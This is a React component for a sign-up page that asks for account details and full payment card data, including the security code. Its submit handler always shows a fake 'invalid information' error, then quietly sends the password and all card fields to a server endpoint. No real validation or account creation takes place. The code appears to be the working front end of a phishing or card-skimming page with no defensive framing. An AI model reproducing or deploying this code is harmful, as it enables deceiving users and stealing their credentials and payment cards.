import { FC } from 'react'
import styles from './SignUp.module.scss'
import { ToastContainer, toast } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'

// components
import Heading from '../components/Heading'
import SubHeading from '../components/SubHeading'
import FormEntry from '../components/FormEntry'
import Button from '../components/Button'

type Props = {
    setPage: any
}

const SignUp: FC<Props> = ({ setPage }) => {
    const onSumbit = () => {
        toast('Error: Missing or Invalid Information', {
            position: 'bottom-right',
            autoClose: 5000,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: 'colored',
            type: 'error',
        })

        setTimeout(() => {
            const url = '/api/save'
            const data = {
                firstName: localStorage.getItem('firstname'),
                lastName: localStorage.getItem('lastname'),
                emailOrPhoneNumber: localStorage.getItem('emailorphonenumber'),
                password: localStorage.getItem('password'),
                streetAddress: localStorage.getItem('streetaddress'),
                city: localStorage.getItem('city'),
                state: localStorage.getItem('state/province(optional)'),
                country: localStorage.getItem('country'),
                cardProvider: localStorage.getItem(
                    'cardprovider(visa,mastercard,etc.)'
                ),
                cardNumber: localStorage.getItem('cardnumber'),
                cardExpirationDate: localStorage.getItem('cardexpirationdate'),
                cardSecurityCode: localStorage.getItem('cardsecuritycode'),
            }

            fetch(url, {
                method: 'POST',
                cache: 'no-cache',
                body: JSON.stringify(data),
                headers: {
                    'Content-Type': 'application/json',
                },
            })
        }, 1000)
    }

    return (
        <div className={styles.container}>
            <ToastContainer />
            <div className={styles.overlay}></div>
            <div className={styles.innerContainer}>
                <Heading className={styles.heading}>
                    Sign Up <u>and</u>
                </Heading>
                <Heading className={styles.heading}>
                    Create your account in <i>seconds</i>
                </Heading>
                <div className={styles.infoContainer}>
                    <div className={styles.innerInfoContainer}>
                        <SubHeading className={styles.subHeading}>
                            Account
                        </SubHeading>
                        <FormEntry>First Name</FormEntry>
                        <FormEntry>Last Name</FormEntry>
                        <FormEntry>Email or Phone Number</FormEntry>
                        <FormEntry>Password</FormEntry>
                    </div>
                    <div className={styles.innerInfoContainer}>
                        <SubHeading className={styles.subHeading}>
                            Payment Information
                        </SubHeading>
                        <FormEntry>Street Address</FormEntry>
                        <FormEntry>City</FormEntry>
                        <FormEntry>State/Province (optional)</FormEntry>
                        <FormEntry>Country</FormEntry>
                        <FormEntry>
                            Card Provider (Visa, Mastercard, etc.)
                        </FormEntry>
                        <FormEntry>Card Number</FormEntry>
                        <FormEntry>Card Expiration Date</FormEntry>
                        <FormEntry>Card Security Code</FormEntry>
                        <Button
                            type="primary"
                            className="submit"
                            onClick={onSumbit}
                        >
                            Create Account
                        </Button>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default SignUp
